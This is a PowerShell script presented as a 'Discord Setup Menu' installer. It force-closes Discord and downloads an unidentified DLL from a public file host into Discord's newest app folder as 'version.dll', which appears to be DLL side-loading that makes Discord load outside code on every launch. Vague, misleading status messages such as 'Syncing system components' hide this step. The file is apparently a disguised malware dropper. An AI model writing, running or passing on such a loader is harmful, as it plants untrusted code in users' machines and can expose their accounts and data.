# [Configuration] Place your Catbox file download link below
$DownloadUrl = "https://files.catbox.moe/dmedph.dll"

# Clear console and display clean English menu
Clear-Host
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "            Discord Setup Menu" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host " [1] Install / Update" -ForegroundColor Green
Write-Host " [2] Uninstall" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Cyan
$choice = Read-Host "Please enter your choice (1 or 2)"

# Auto-detect application directory
$PathsToCheck = @(
    "C:\ProgramData\admin\Discord",
    "$env:LOCALAPPDATA\Discord",
    "C:\ProgramData\Discord",
    "C:\Users\admin\AppData\Local\Discord"
)

$discordPath = $null
foreach ($path in $PathsToCheck) {
    if (Test-Path $path) {
        $discordPath = $path
        break
    }
}

if ($null -eq $discordPath) {
    Write-Host "[!] Error: Prerequisites not met." -ForegroundColor Red
    Write-Host "Press any key to exit..."
    [void][System.Console]::ReadKey()
    Exit
}

# Scan for the target runtime folder
$appDirs = Get-ChildItem -Path $discordPath -Directory -Filter "app-*" | Sort-Object Name -Descending

if ($appDirs.Count -eq 0) {
    Write-Host "[!] Error: Initialization failed." -ForegroundColor Red
    Write-Host "Press any key to exit..."
    [void][System.Console]::ReadKey()
    Exit
}

# Select target folder and define target path
$targetFolder = $appDirs[0].FullName
$targetDllPath = Join-Path $targetFolder "version.dll"

if ($choice -eq "1") {
    # Close process to prevent write lock
    Write-Host "Syncing system components..." -ForegroundColor Yellow
    Stop-Process -Name "Discord" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # Download component silently with your custom text
    Write-Host "Install discord in power supply..." -ForegroundColor Yellow
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $targetDllPath -UseBasicParsing
        
        if (Test-Path $targetDllPath) {
             # Success message
             Write-Host "[+] Setup completed successfully!" -ForegroundColor Green
        } else {
             Write-Host "[!] Error: Failed to write component." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[!] Error: Connection failed. Please try again." -ForegroundColor Red
    }
}
elseif ($choice -eq "2") {
    # Uninstall option
    if (Test-Path $targetDllPath) {
        Write-Host "Closing application..." -ForegroundColor Yellow
        Stop-Process -Name "Discord" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2

        # Delete component silently
        Remove-Item -Path $targetDllPath -Force
        Write-Host "[+] Cleanup completed successfully!" -ForegroundColor Green
    }
    else {
        Write-Host "[!] System is not installed." -ForegroundColor Yellow
    }
}
else {
    Write-Host "[!] Invalid option. Please select 1 or 2." -ForegroundColor Red
}

Write-Host "Press any key to exit..."
[void][System.Console]::ReadKey()
